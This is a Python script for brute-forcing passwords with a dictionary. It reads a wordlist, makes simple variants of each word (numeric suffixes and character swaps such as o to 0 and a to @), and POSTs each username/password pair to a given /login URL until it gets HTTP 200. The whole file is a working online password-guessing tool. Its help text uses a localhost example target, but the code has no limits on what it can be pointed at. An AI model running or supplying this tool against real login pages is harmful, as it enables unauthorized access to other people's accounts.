#!/usr/bin/env python3
"""
Dictionary-based brute-force tool with simple mutations.

Reads a wordlist (one word per line), applies mutations (suffixes and character substitutions),
and tests each candidate against the target /login endpoint.
"""

import argparse
import sys
import time
import requests


def load_wordlist(path):
    """Load wordlist from file (one word per line). Returns list of words."""
    try:
        with open(path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Wordlist file not found: {path}", file=sys.stderr)
        sys.exit(2)


def mutate_word(word):
    """Generate simple mutations of a word.
    
    Returns list of candidates including:
      - Original word with suffixes ['', '1', '123']
      - Character substitutions o->0, a->@, i->1 with suffixes
    """
    candidates = []
    suffixes = ["", "1", "123"]
    
    # Add original word with suffixes
    for suffix in suffixes:
        candidates.append(word + suffix)
    
    # Apply character replacements
    mutated = word
    mutated = mutated.replace("o", "0").replace("O", "0")
    mutated = mutated.replace("a", "@").replace("A", "@")
    mutated = mutated.replace("i", "1").replace("I", "1")
    
    # Only add mutated variants if different from original
    if mutated != word:
        for suffix in suffixes:
            candidates.append(mutated + suffix)
    
    return candidates


def try_post(url, payload, timeout=5.0, max_retries=3):
    """POST JSON payload to url with retries. Returns response or None."""
    backoff = 0.5
    for attempt in range(1, max_retries + 1):
        try:
            r = requests.post(url, json=payload, timeout=timeout)
            return r
        except requests.RequestException as e:
            if attempt == max_retries:
                print(f"[!] Request failed after {attempt} attempts: {e}")
                return None
            else:
                time.sleep(backoff)
                backoff *= 2
    return None


def main():
    parser = argparse.ArgumentParser(description="Dictionary-based brute-force tool")
    parser.add_argument("--target", required=True, help="Target URL (e.g. http://127.0.0.1:5000/login)")
    parser.add_argument("--user", required=True, help="Username to test")
    parser.add_argument("--list", required=True, help="Path to wordlist file (one word per line)")
    parser.add_argument("--delay", type=float, default=0.05, help="Delay in seconds between attempts")
    args = parser.parse_args()

    words = load_wordlist(args.list)
    print(f"[+] Loaded {len(words)} words from {args.list}")

    tried = 0
    start = time.time()

    try:
        for word in words:
            candidates = mutate_word(word)
            
            for candidate in candidates:
                payload = {"username": args.user, "password": candidate}
                r = try_post(args.target, payload)
                tried += 1

                if r is None:
                    print(f"[-] Request failed for candidate '{candidate}', skipping")
                else:
                    if r.status_code == 200:
                        elapsed = time.time() - start
                        print(f"FOUND: {candidate} (tried {tried} candidates in {elapsed:.1f}s)")
                        return 0
                    else:
                        if tried % 50 == 0:
                            elapsed = time.time() - start
                            print(f"[i] Tried {tried} candidates, last='{candidate}', elapsed={elapsed:.1f}s")

                time.sleep(args.delay)

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        return 130

    print(f"Not found (tried {tried} candidates)")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
